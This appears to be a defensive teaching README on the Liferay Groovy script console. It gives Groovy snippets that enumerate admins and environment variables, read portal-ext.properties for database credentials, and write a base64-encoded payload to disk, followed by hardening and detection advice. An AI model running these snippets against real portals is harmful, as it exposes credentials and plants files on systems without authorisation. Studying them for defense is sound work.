# The Liferay Groovy script console

Full writeup: [jperezduerto.info/techniques/liferay-groovy-console](https://jperezduerto.info/techniques/liferay-groovy-console/)

Liferay's Control Panel ships a Groovy script console (Server Administration >
Script) that runs code in the portal JVM with the privileges of the account
Liferay runs as. There is no sandbox, so reaching the console means code
execution as that service account. This folder shows, read-only where it
matters, what that exposes, so defenders understand the real attack surface,
then how to restrict, contain, and detect it.

Scope: this is a teaching resource. It covers enumeration, file read, and file
transfer so you can recognize and detect them. It does **not** cover executing
staged binaries, packing, or privilege escalation. For the over-privileged
service case that turns this console into host compromise, see
[tcb-privilege-to-system](../tcb-privilege-to-system/).

## Account and host enumeration (read-only)

Confirm the identity and context the console runs as:

```groovy
println System.getProperty("user.name")
println System.getProperty("os.name") + " " + System.getProperty("os.version")
println System.getProperty("liferay.home")
System.getenv().sort().each { k, v -> println "${k}=${v}" }
```

Enumerate application accounts through Liferay's own services (read-only):

```groovy
import com.liferay.portal.kernel.service.UserLocalServiceUtil
import com.liferay.portal.kernel.service.RoleLocalServiceUtil

// How many users, and who the administrators are
println "users: " + UserLocalServiceUtil.getUsersCount()
UserLocalServiceUtil.getRoleUsers(
    RoleLocalServiceUtil.getRole(
        com.liferay.portal.kernel.util.PortalUtil.getDefaultCompanyId(),
        "Administrator").getRoleId()
).each { println "admin: " + it.getScreenName() + " <" + it.getEmailAddress() + ">" }
```

The lesson for a defender: the reach of all of this equals the privilege of the
service account and the admin role. Keep both small.

## File read (read-only)

Groovy reads any file the service account can read. The usual prize is the
portal configuration, which often holds database credentials in cleartext:

```groovy
def home = System.getProperty("liferay.home")
println new File(home, "portal-ext.properties").text
```

If that file carries a `jdbc.default.*` block, a single reachable admin page has
become a data-store credential disclosure.

## File transfer (why the console is arbitrary-write, not just a script runner)

A script console does not only read; it writes. An attacker who cannot use an
upload form can still move bytes through the text box by encoding them.
base64+gzip is a common transport: compress and base64 on one side, decode and
decompress inside a short script on the other. Shown here writing and verifying
a file so you can see the shape of it; no execution is performed.

```groovy
// b64 = a gzip-compressed, base64-encoded payload pasted as text
def b64 = "H4sIAAAA..."                        // truncated placeholder
def gz  = new ByteArrayInputStream(b64.decodeBase64())
def data = new java.util.zip.GZIPInputStream(gz).bytes
def out = new File(System.getProperty("java.io.tmpdir"), "transferred.bin")
out.bytes = data
// Verify integrity, do not run anything
println java.security.MessageDigest.getInstance("SHA-256")
    .digest(out.bytes).encodeHex().toString()
```

The defensive takeaway: treat the console as granting arbitrary file **write**
to the service account, not just script evaluation. That is why the hardening
below restricts who can reach it and what the account can touch, and why the
detection below watches for file creation by the service account.

## Defense

The console is safe only when few people can reach it, the account behind it is
weak, and its use is watched.

- **Restrict or remove the console in production.** Treat Server Administration
  > Script as break-glass. Grant the administrative permissions that reach it
  to a single, tightly held role, audit that list, and keep the admin UI off
  the public internet (VPN or allowlisted management network, segmented from
  the user-facing site).
- **Run Liferay least privileged.** A dedicated, low-privilege service account,
  never root, Administrator, or LocalSystem, and with no powerful Windows user
  rights. This caps the blast radius of both file read and file write.
- **Keep secrets out of reach.** Do not store database or integration
  credentials in cleartext in `portal-ext.properties` where the service
  account can read them. Use a secret store or restrictive file permissions,
  and rotate anything that may have been exposed.
- **Enforce MFA on admins.** Most console abuse starts with a weak or reused
  admin credential, not a Liferay bug. Protect omni-admin and company-admin
  accounts the hardest.

## Detection

- **Liferay audit events.** Enable auditing and alert on access to Server
  Administration and on script execution outside your break-glass process.
- **Access logs.** Requests to the Server Administration script endpoint are a
  narrow, high-signal path; alert on an unexpected user, IP, or hour.
- **Service-account behavior.** The portal account creating files (especially
  executables or files in temp directories), reading credential files, spawning
  a process, or making unexpected outbound connections is strong evidence the
  console (or another code-execution path) is in use. Endpoint and
  process/file-creation telemetry on the host catches this even when the app
  logs do not.
- **Correlate.** An admin authentication, then a Server Administration script
  request, then the service account writing a file or touching credentials, is
  the full chain and a high-confidence detection.

## Use

Authorized and educational use only: your own systems, a lab you control, or an
engagement with written permission. The snippets here are read-only recon,
configuration read, and a file-write illustration to show why an exposed
console is dangerous and how to detect it, not a toolkit for use against
systems you do not own.
